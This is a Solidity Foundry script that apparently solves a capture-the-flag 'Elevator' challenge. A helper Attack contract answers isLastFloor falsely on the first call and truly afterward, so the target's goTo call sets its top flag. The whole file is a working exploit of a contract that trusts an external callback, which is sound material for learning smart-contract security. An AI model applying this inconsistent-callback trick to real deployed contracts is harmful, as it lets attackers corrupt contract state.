// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Elevator} from "../src/Elevator.sol";

contract ElevatorSolve is Script{
    Elevator public elevator = Elevator(0xa32a12f573871eE4C1B6d2E9B8BA424d4cD01718);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Top : ", elevator.top());

        new Attack().exploit();

        console.log("Top : ", elevator.top());
        vm.stopBroadcast();
    }
}

contract Attack{
    Elevator public elevator = Elevator(0xa32a12f573871eE4C1B6d2E9B8BA424d4cD01718);
    uint public callCount;
    function exploit() public payable{
        elevator.goTo(10);
    }

    function isLastFloor(uint) external returns (bool){
        callCount += 1;
        if(callCount == 1){
            return false;
        }
        return true;
    }

}